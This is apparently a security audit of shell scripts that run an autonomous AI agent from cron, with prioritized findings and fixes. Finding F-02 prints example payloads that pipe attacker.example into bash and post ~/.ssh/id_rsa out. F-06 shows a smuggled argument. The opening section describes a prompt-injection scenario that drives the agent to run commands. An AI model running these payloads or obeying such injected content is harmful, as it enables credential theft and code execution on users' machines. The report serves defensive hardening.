Executive verdict

No clear hardcoded API secret/token was present in the pasted files. I also did not find classic curl | bash, shell eval, or direct shell metacharacter injection from filenames into command execution.

The serious risk is architectural: this repo’s executable surface deliberately runs an autonomous agent from cron with filesystem write/edit permissions and Bash, while consuming web/GitHub/forum-discovered content. That is not a tiny quoting bug; it is an untrusted-input-to-local-command boundary. I would not run the daily/weekly automation on a workstation containing real credentials without sandboxing, review gates, and removal of autonomous Bash.

Scenario

A malicious GitHub repo, MCP listing, forum post, newsletter item, or prompt-injected web page is discovered. The evaluation/integration flow then processes that attacker-controlled text with WebFetch/WebSearch, Write, Edit, and Bash enabled. If the model follows adversarial instructions or integrates a malicious capability, the cron job can write files or run shell commands as the user.

This is not a syntactic shell injection, but the resulting impact can be the same: local command execution under the account running cron.

Fix

Make the default mode non-executable and review-gated:

Bash
--allowed-tools Read Glob Grep WebFetch WebSearch

For integration, generate a patch/report only:

Bash
--allowed-tools Read Write Glob Grep

Then require a human to review and apply. If autonomous execution is retained, run it inside a disposable container or low-privilege OS account with no SSH keys, no browser profile, no cloud tokens, no writable home directory, restricted network egress, and a clean allowlist of permitted commands. Add a policy layer that forbids writing shell startup files, Claude config, crontabs, package manager config, .env, .ssh, .git/hooks, and MCP configs without explicit approval.

F-02 — P1 — Unsafe .env loading via source is code execution

Files / exact lines

scripts/evolution-daily.sh

Bash
if [[ -f "$EVOLUTION_DIR/.env" ]]; then
    set -a
    source "$EVOLUTION_DIR/.env"
    set +a
fi

scripts/evolution-weekly.sh

Bash
if [[ -f "$EVOLUTION_DIR/.env" ]]; then
    set -a
    source "$EVOLUTION_DIR/.env"
    set +a
fi

Scenario

A .env file is treated as shell code. This is safe only if the file is fully trusted and never generated or modified by automation. A malicious .env could contain:

Bash
DISCOVERY_MODEL=sonnet
curl https://attacker.example/payload | bash

or:

Bash
DISCORD_WEBHOOK_URL=$(cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://attacker.example/)

Because the daily script grants the agent write access inside the repo, a compromised integration flow could plant or modify .env and get execution on the next cron run.

Fix

Do not source config files. Parse only allowlisted KEY=value variables as data:

Bash
load_env_value() {
    local key="$1"
    local file="$2"
    grep -E "^[[:space:]]*${key}=" "$file" \
      | tail -n 1 \
      | sed -E "s/^[[:space:]]*${key}=//; s/^['\"]//; s/['\"]$//"
}

if [[ -f "$EVOLUTION_DIR/.env" ]]; then
    DISCOVERY_MODEL="$(load_env_value DISCOVERY_MODEL "$EVOLUTION_DIR/.env")"
    EVAL_MODEL="$(load_env_value EVAL_MODEL "$EVOLUTION_DIR/.env")"
    DISCORD_WEBHOOK_URL="$(load_env_value DISCORD_WEBHOOK_URL "$EVOLUTION_DIR/.env")"
fi

Also enforce ownership and mode before reading:

Bash
[[ -O "$EVOLUTION_DIR/.env" ]] || exit 1
[[ "$(stat -c %a "$EVOLUTION_DIR/.env")" =~ ^6[04]0$ ]] || exit 1
F-03 — P1 — Unpinned npx ...@latest executes mutable npm code

File / exact lines

reference-config/skills/browser-mcp-setup/scripts/ensure-better-playwright.sh

Bash
USE_CHROMIUM=true nohup npx better-playwright-mcp3@latest server -p "$PORT" > "$LOG_FILE" 2>&1 &

Scenario

Every first run can fetch and execute whatever better-playwright-mcp3@latest resolves to at that moment. If the npm package, maintainer account, dependency chain, registry response, or local package resolution is compromised, this becomes code execution as the user running the script.

This is analogous in risk shape to curl | bash: not identical syntax, but still remote mutable code execution.

Fix

Pin and lock the dependency:

Bash
# package.json
{
  "dependencies": {
    "better-playwright-mcp3": "x.y.z"
  }
}

Then run:

Bash
npm ci --ignore-scripts
USE_CHROMIUM=true nohup ./node_modules/.bin/better-playwright-mcp3 server -p "$PORT" > "$LOG_FILE" 2>&1 &

If package lifecycle scripts are required, document that explicitly. Prefer a checked-in lockfile, integrity verification, and no @latest in executable scripts.

F-04 — P1 — README/status script instructs users to expose Chrome DevTools on 0.0.0.0

File / exact lines

reference-config/skills/browser-mcp-setup/scripts/check-browser-status.sh

Bash
echo "  Start Chrome on Windows with:"
echo '    & "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0'

Scenario

Chrome DevTools Protocol is effectively browser-control authority. Binding it to 0.0.0.0 can expose the debugging endpoint to other machines on the network, depending on firewall and WSL/Windows networking. An attacker who can reach the port may inspect tabs, read page content, execute JavaScript in active sessions, navigate the browser, and potentially steal session material.

This is not auto-executed by the script, so I rank it P1 rather than P0, but the consequence of following the instruction can be credential/session compromise.

Fix

Bind only to loopback:

PowerShell
& "C:\Program Files\Google\Chrome\Application\chrome.exe" `
  --remote-debugging-port=9222 `
  --remote-debugging-address=127.0.0.1

For WSL access, use an explicit local tunnel or firewall rule limited to the WSL host. Add warning text that the DevTools port must never be exposed to LAN/WAN interfaces.

F-05 — P1 — Predictable /tmp PID files allow local process DoS and possible file clobber

Files / exact lines

reference-config/skills/browser-mcp-setup/scripts/ensure-better-playwright.sh

Bash
PID_FILE="/tmp/better-playwright.pid"
LOG_FILE="/tmp/better-playwright.log"
Bash
PID=$(cat "$PID_FILE")
if kill -0 "$PID" 2>/dev/null && check_health; then
Bash
echo $! > "$PID_FILE"
Bash
echo "Better Playwright started successfully (PID: $(cat $PID_FILE), Port: $PORT)"

reference-config/skills/browser-mcp-setup/scripts/stop-better-playwright.sh

Bash
PID_FILE="/tmp/better-playwright.pid"
Bash
PID=$(cat "$PID_FILE")
if kill -0 "$PID" 2>/dev/null; then
    echo "Stopping Better Playwright (PID: $PID)..."
    kill "$PID" 2>/dev/null
    sleep 0.5
fi
rm -f "$PID_FILE"

scripts/evolution-daily.sh

Bash
LOCK_FILE="/tmp/evolution-daily.lock"

scripts/evolution-weekly.sh

Bash
LOCK_FILE="/tmp/evolution-weekly.lock"

Scenario

The PID and lock paths are predictable and placed in a world-writable directory. A local attacker can pre-create /tmp/better-playwright.pid with special values. For example, a PID value of -1 is not rejected. Depending on shell/OS behavior and permissions, kill "$PID" with PID=-1 can signal all processes the user is allowed to signal. Even without that edge case, stale or attacker-controlled PID files can kill unrelated processes.

The echo $! > "$PID_FILE" write also risks symlink/file-clobber behavior on systems without hardened symlink protections, especially if scripts are ever run with elevated privileges.

The lock files are also non-atomic, so parallel runs can race through the [[ -f "$LOCK_FILE" ]] check and both run.

Fix

Use a private runtime directory and validate PID content:

Bash
RUNTIME_DIR="${XDG_RUNTIME_DIR:-$HOME/.cache/claude-evolution/run}"
install -d -m 700 "$RUNTIME_DIR"

PID_FILE="$RUNTIME_DIR/better-playwright.pid"
LOG_FILE="$RUNTIME_DIR/better-playwright.log"

read -r PID < "$PID_FILE" || PID=""
if [[ "$PID" =~ ^[1-9][0-9]*$ ]] && kill -0 "$PID" 2>/dev/null; then
    kill "$PID"
fi

For locks, use flock:

Bash
LOCK_FILE="$RUNTIME_DIR/evolution-daily.lock"
exec 9>"$LOCK_FILE"
flock -n 9 || { log "Another run in progress, exiting"; exit 0; }
F-06 — P2 — Unvalidated PORT is used in curl URLs and unquoted lsof invocations

Files / exact lines

reference-config/skills/browser-mcp-setup/scripts/ensure-better-playwright.sh

Bash
PORT=${1:-3102}
Bash
curl -s "http://localhost:$PORT/health" >/dev/null 2>&1
Bash
existing_pid=$(lsof -ti:$PORT 2>/dev/null)

reference-config/skills/browser-mcp-setup/scripts/stop-better-playwright.sh

Bash
PORT=${1:-3102}
Bash
local pid=$(lsof -ti:$PORT 2>/dev/null)

Scenario

This is not direct shell command injection because the dangerous command execution path is not evaled. However, PORT is not constrained to a number.

Because lsof -ti:$PORT is unquoted, a value containing spaces can become additional lsof arguments. A malicious or accidental invocation such as:

Bash
./stop-better-playwright.sh '3102 -c ssh'

could change what lsof matches and potentially cause the script to kill unintended processes.

The curl URL also trusts PORT as URL syntax. Weird values can change parsing semantics or make the health check behave unexpectedly.

Fix

Reject anything except a valid TCP port:

Bash
PORT="${1:-3102}"
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    echo "Invalid port: $PORT" >&2
    exit 2
fi

Quote and structure lsof safely:

Bash
lsof -nP -tiTCP:"$PORT" -sTCP:LISTEN

Also handle multiple PIDs explicitly:

Bash
mapfile -t pids < <(lsof -nP -tiTCP:"$PORT" -sTCP:LISTEN 2>/dev/null)
for pid in "${pids[@]}"; do
    [[ "$pid" =~ ^[1-9][0-9]*$ ]] && kill "$pid" 2>/dev/null
done

F-08 — P2 — .private-patterns regex is trusted and passed to grep -E without --

File / exact lines

scripts/test-public-config.sh

Bash
PRIVATE_PATTERNS_FILE="$(dirname "$0")/.private-patterns"
Bash
PRIVATE_PROJECTS=$(sed -n '1p' "$PRIVATE_PATTERNS_FILE")
Bash
matches=$(grep -niE "$PRIVATE_PROJECTS" "$f" || true)
Bash
PRIVATE_AGENTS=$(sed -n '2p' "$PRIVATE_PATTERNS_FILE")
Bash
matches=$(grep -niE "$PRIVATE_AGENTS" "$f" || true)

Scenario

This is not shell injection because the pattern is quoted. However, a malicious or malformed .private-patterns line can alter grep behavior if interpreted as an option-like pattern, create catastrophic backtracking-style performance issues depending on regex engine/features, or simply make the test unreliable. Since .private-patterns is gitignored/private, this is hardening rather than a public exploit.

Fix

Use -- before patterns:

Bash
matches=$(grep -niE -- "$PRIVATE_PROJECTS" "$f" || true)

If the patterns are intended to be literal names, prefer fixed-string mode:

Bash
matches=$(grep -niF -- "$PRIVATE_PROJECTS" "$f" || true)

Validate non-empty patterns before scanning:

Bash
[[ -n "$PRIVATE_PROJECTS" ]] || { echo "No private project patterns configured"; exit 1; }
F-09 — P2 — Hardcoded private path / username patterns are themselves visible

File / exact lines

scripts/test-public-config.sh

Bash
matches=$(grep -nE '(/home/ashita|~/claudeworkspace|/home/[a-z]+/)' "$f" || true)

Scenario

This test is intended to prevent private path leaks, but the scanner itself exposes likely private identifiers:

/home/ashita
~/claudeworkspace

This is not a secret. It is low-grade privacy/OSINT leakage. It could help an attacker craft social-engineering or path-specific payloads, but it is not credential material.

Fix

Make the public test generic:

Bash
matches=$(grep -nE '(/home/[^/[:space:]]+|~/[^/[:space:]]+)' "$f" || true)

Move truly private names into the gitignored .private-patterns file that the script already expects.

F-12 — P2 — Optional Discord notification can exfiltrate discovery report contents

File / exact lines

scripts/evolution-daily.sh

Bash
if [[ -n "${DISCORD_WEBHOOK_URL:-}" ]]; then
    REPORT_FILE="pipeline/discovery/daily/$(date +%Y%m%d).md"
    if [[ -f "$REPORT_FILE" ]]; then
        SUMMARY=$(head -20 "$REPORT_FILE")
        curl -s -H "Content-Type: application/json" \
            -d "$(jq -n --arg title "Daily Discovery - $(date +%Y-%m-%d)" --arg desc "$SUMMARY" \
            '{embeds: [{title: $title, description: $desc, color: 3447003}]}')" \

README.md

Bash
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/your/webhook

Scenario

The README value is a placeholder, not a secret. The risk is that once a real webhook is configured, the script sends the first 20 lines of the daily report to Discord. If reports ever include private repo names, local paths, tokens copied from evaluated examples, or sensitive URLs, the script forwards them externally.

Fix

Make outbound notification explicitly redacted:

Bash
SUMMARY=$(
  head -20 "$REPORT_FILE" \
    | sed -E 's#(https://discord\.com/api/webhooks/)[^[:space:]]+#\1[REDACTED]#g' \
    | sed -E 's#(api[_-]?key|token|secret|password)[[:space:]]*[:=][^[:space:]]+#\1=[REDACTED]#ig'
)

Also document that reports may be sent to a third party and should not include secrets.

Final verdict

Do not run this as-is on a real developer workstation with credentials. The shell quoting is mostly decent, and there is no obvious eval/curl | bash disaster in the pasted scripts, but the system intentionally connects untrusted discovery sources to autonomous local write/edit/Bash capability. The highest-priority fixes are: remove autonomous Bash, stop sourcing .env, pin npx dependencies, remove the 0.0.0.0 Chrome DevTools instruction, and replace /tmp PID/lock handling with private runtime files plus PID validation.

Three likely-missed findings

Prompt files not reviewed: HEARTBEAT-DAILY.md, EVALUATE-PENDING.md, INTEGRATE-APPROVED.md, and GENERATE-HELPERS.md are effectively executable policy for the claude -p calls. A malicious or overly permissive instruction there could be more dangerous than any shell bug in the wrapper scripts.

MCP / Claude config mutation not reviewed: The README says approved MCP servers, skills, agents, and configs are automatically integrated. The actual write targets and config templates could introduce command execution through Claude/MCP startup even without shell-script injection.

Package/runtime behavior not reviewed: better-playwright-mcp3, claude CLI behavior, npm lifecycle scripts, and MCP server binding defaults were not audited here. Any one of those could expand the executable surface beyond what is visible in these shell wrappers.
